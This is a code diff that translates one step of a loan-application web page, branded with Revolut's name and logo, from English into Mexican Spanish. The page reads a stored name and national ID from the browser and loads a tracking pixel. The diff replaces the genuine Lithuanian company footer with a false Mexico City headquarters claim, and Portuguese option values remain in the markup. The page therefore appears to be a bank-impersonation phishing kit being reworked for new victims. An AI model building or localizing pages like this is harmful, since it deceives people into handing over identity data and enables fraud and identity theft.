@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es-MX">
 <head>
 <script>
 (function(){
@@ -17,7 +17,7 @@
 </script>
 <meta charset="utf-8"/>
 <meta content="width=device-width,initial-scale=1" name="viewport"/>
-<title>Loan Purpose — RevolutBank</title>
+<title>Propósito del Préstamo — RevolutBank</title>
 <style>
   @import url("https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Sora:wght@600;700;800&display=swap");
 
@@ -220,8 +220,8 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <div class="progress-text">1 of 5</div>
     </div>
 
-    <h1 class="title"><span data-msg="step3.t04">Loan Purpose</span></h1>
-    <p class="subtitle"><span data-msg="step3.t05">What do you need the loan for?</span></p>
+    <h1 class="title"><span data-msg="step3.t04">Propósito del Préstamo</span></h1>
+    <p class="subtitle"><span data-msg="step3.t05">¿Para qué necesitas el préstamo?</span></p>
 
     <div class="grid" id="grid">
       <div class="opt" data-value="Pagar despesas">
@@ -238,7 +238,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       </div>
       <div class="opt" data-value="Reformar casa">
         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 10l9-7 9 7v10a2 2 0 01-2 2h-4v-6h-6v6H5a2 2 0 01-2-2V10z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-        <span><span data-msg="step3.t09">Home renovation</span></span>
+        <span><span data-msg="step3.t09">Remodelación del hogar</span></span>
       </div>
       <div class="opt" data-value="Compras">
         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 4h2l2.6 12.3a2 2 0 002 1.7h8.5a2 2 0 002-1.6L21 8H6" stroke-linecap="round" stroke-linejoin="round"/><circle cx="9" cy="21" r="1.4"/><circle cx="18" cy="21" r="1.4"/></svg>
@@ -246,12 +246,12 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       </div>
       <div class="opt" data-value="Outros motivos">
         <svg fill="none" stroke="currentColor" viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" stroke-linecap="round"/><circle cx="12" cy="12" r="3"/></svg>
-        <span><span data-msg="step3.t11">Other reasons</span></span>
+        <span><span data-msg="step3.t11">Otro reasons</span></span>
       </div>
     </div>
 
-    <button class="btn-next" id="btnNext" type="button">
-      <span><span data-msg="step3.t12">Continue</span></span>
+    <button class="btn-next" id="btnSiguiente" type="button">
+      <span><span data-msg="step3.t12">Continuar</span></span>
       <div class="spinner"></div>
     </button>
 
@@ -270,13 +270,13 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
       <img src="images/revolut-logo.svg" alt="Revolut" style="height:36px;width:auto;display:block;margin:0 auto;"/>
     </div>
     <div class="footer-company">Revolut</div>
-    <div class="footer-meta">Revolut Bank UAB — Headquartered in Lithuania</div>
+    <div class="footer-meta">RevolutBank — Con sede en Ciudad de México</div>
     <div class="footer-badges">
       <span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
           <path d="M12 15v2m-6 4h12a2 2 0 002-2v-7a2 2 0 00-2-2H6a2 2 0 00-2 2v7a2 2 0 002 2zm10-11V7a4 4 0 00-8 0v4h8z" stroke-linecap="round" stroke-linejoin="round"/>
         </svg>
-        SSL Secure
+        SSL Seguro
       </span>
       <span>
         <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
@@ -289,7 +289,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
 </footer>
 
 <script>
-  // Show name + National ID Number in header
+  // Show name + CURP / INE in header
   (function () {
     const nome = localStorage.getItem('nome') || '';
     const nif  = localStorage.getItem('nif')  || '';
@@ -310,7 +310,7 @@ src="https://www.facebook.com/tr?id=2332401467564454&ev=PageView&noscript=1"
   })();
 
   const grid = document.getElementById('grid');
-  const btn  = document.getElementById('btnNext');
+  const btn  = document.getElementById('btnSiguiente');
   let selected = null;
 
   grid.addEventListener('click', (e) => {
